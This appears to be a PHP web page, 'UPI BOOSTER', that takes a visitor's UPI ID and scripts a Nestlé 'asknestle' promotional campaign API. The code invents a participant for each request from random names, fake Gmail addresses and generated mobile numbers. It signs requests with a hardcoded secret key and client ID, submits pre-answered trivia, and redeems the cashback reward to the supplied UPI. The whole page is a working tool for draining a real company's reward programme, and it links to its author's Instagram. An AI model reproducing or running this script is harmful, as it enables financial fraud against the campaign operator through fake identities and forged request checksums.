<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>UPI BOOSTER</title>
<link rel="stylesheet" href="ms.css">
</head><body><div class="main-container"><div class="heading-text"> 10₹ UPi Adder </div>

<?php
if (!isset($_POST['submit'])) {
    echo "<form method='POST' action=''>
        <input type='text' name='upi' class='input' placeholder='Enter Your UPI' required />
        <input type='submit' value='SUBMIT' name='submit' class='button shine'>
    </form>";
} else {
    $upi = $_POST['upi'];
    $f = array("Vasu","Nirmal","Akshay","Chander","Rupinder","Akhil","Shanti","Ravi","Kunal","Chandrakant","Sulabha","Mahinder","Swapnil","Deepa","Sulabha","Neelima","Vijaya","Nikhil","Isha","Siddhi","Ajeet","Kshitija","Anila","Jitender","Sumeet","Preethi","Priti","Gayathri","Dhaval","Mukesh","Lalita","Rachana","Rakhi","Harshal","Shekhar","Rajiv","Balakrishna","Ajeet","Tara","Chander","Deepa","Prabhu","Rajendra","Jeetendra","Nandu","Aniket","Sumati","Prabhu","Vimal","Indira","Laxman","Agni","Kapil","Kailash","Puneet","Pratik","Pankaj","Ishore","Swati","Rupa","Hardeep","Prabhu","Khushi","Gurmeet","Nishant","Rishi","Naveen");
    $fname = $f[mt_rand(0,60)];
    $email = $fname . mt_rand(1000,9000) . "@gmail.com";

    function generateIndianMobileNumber() {
        $prefixes = [6, 7, 8, 9]; 
        $firstDigit = $prefixes[array_rand($prefixes)];
        $remainingDigits = mt_rand(100000000, 999999999); 
        return $firstDigit . $remainingDigits;
    }

    $num = generateIndianMobileNumber();

    function sha256($data) {
        return hash('sha256', $data);
    }

    function sortJsonBody($json) {
        $decoded = json_decode($json, true);
        if (!is_array($decoded)) return "";
        krsort($decoded); 
        return json_encode($decoded, JSON_UNESCAPED_SLASHES);
    }

    function generateChecksum($data, $hashkey) {
        $secretHash = sha256($hashkey);
        $sortedBody = sortJsonBody($data);
        $checksumInput = ($sortedBody !== "" && $sortedBody !== "{}") ? $secretHash . $sortedBody : $secretHash;
        return sha256($checksumInput);
    }

    $hashkey = "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@";

  
    $url = "https://web.myfidelity.in/api/v1/nestle-asknestle/save-user-detail";
    $data = '{"msisdn":"'.$num.'","firstName":"'.$fname.'","lastName":"","emailId":"'.$email.'","howOldIsYourKid":"Between 2-6 Years Old","state":"Delhi","consent1":true,"consent2":true,"isLoginAllowed":false,"ssoId":"NA"}';
    $checksum = generateChecksum($data, $hashkey);
    $head0 = [];
    $head0[] = "checksum: $checksum";
    $head0[] = "Content-Type: application/json";
    $head0[] = "Accept: application/json";
    $head0[] = "msisdn: $num";
    $head0[] = "campaignId: 1";
    $head0[] = "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=";
    $head0[] = "appVersion: 1.0";
    $head0[] = "appName: asknestle";
    $head0[] = "channel: WEB";
    $head0[] = "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36";

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head0);
    $resp = curl_exec($ch);
    curl_close($ch);
  //  echo" $resp";

 
    $url = "https://web.myfidelity.in/api/v1/nestle-asknestle/save-answers";
    $data = '{"msisdn":"'.$num.'","answersMap":{"trivia1":{"answer":"Carbohydrate","question":"Which nutrient is the major source of energy for the body?","isCorrect":true},"trivia2":{"answer":"It has nutrients for good gut health","question":"This is a benefit of eating curd?","isCorrect":true},"trivia3":{"answer":"2000 kcal","question":"What is the average energy requirement for an adult per day?","isCorrect":true},"trivia4":{"answer":"Milk & milk products","question":"Fiber rich food does not include?","isCorrect":true},"trivia5":{"answer":"Guava","question":"Which among these is NOT a good source of vitamin A?","isCorrect":true}}}';
    $checksum = generateChecksum($data, $hashkey);
    $head0 = [];
    $head0[] = "checksum: $checksum";
    $head0[] = "Content-Type: application/json";
    $head0[] = "Accept: application/json";
    $head0[] = "msisdn: $num";
    $head0[] = "campaignId: 1";
    $head0[] = "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=";
    $head0[] = "appVersion: 1.0";
    $head0[] = "appName: asknestle";
    $head0[] = "channel: WEB";
    $head0[] = "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36";

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head0);
    $resp = curl_exec($ch);
    curl_close($ch);
    //echo" $resp";

 
    $url = "https://web.myfidelity.in/api/v1/nestle-asknestle/save-upi-info";
    $data = '{"vpa":"'.$upi.'"}';
    $checksum = generateChecksum($data, $hashkey);
    $head0 = [];
    $head0[] = "checksum: $checksum";
    $head0[] = "Content-Type: application/json";
    $head0[] = "Accept: application/json";
    $head0[] = "msisdn: $num";
    $head0[] = "campaignId: 1";
    $head0[] = "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=";
    $head0[] = "appVersion: 1.0";
    $head0[] = "appName: asknestle";
    $head0[] = "channel: WEB";
    $head0[] = "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36";

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head0);
    $resp = curl_exec($ch);
    curl_close($ch);
    $json = json_decode(  $resp, true);
    $msg = $json["msg"];
    //echo" $resp";
    if ($json['status'] === 'SUCCESS') {
   
        $url = "https://web.myfidelity.in/api/v1/nestle-asknestle/redemption";
        $data = '{"redemptionType":"CASHBACK"}';
        $checksum = generateChecksum($data, $hashkey);
        $head0 = [];
        $head0[] = "checksum: $checksum";
        $head0[] = "Content-Type: application/json";
        $head0[] = "Accept: application/json";
        $head0[] = "msisdn: $num";
        $head0[] = "campaignId: 1";
        $head0[] = "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=";
        $head0[] = "appVersion: 1.0";
        $head0[] = "appName: asknestle";
        $head0[] = "channel: WEB";
        $head0[] = "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36";

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $head0);
        $resp = curl_exec($ch);
        curl_close($ch);
        $json = json_decode($resp, true);
    
    echo "<div class='success msg'>{$json['msg']}</div>"; 
} else {
    echo "<div class='error msg'>{$msg}</div>"; 
  
}}
?>
      
	  <a href="https://instagram.com/sujithembram52" class="telBtn">
            <i class="fa-regular fa-paper-plane"></i><span>Follow On Instagram</span>
        </a>

        <br><br>
    
    </div>
</body>
</html>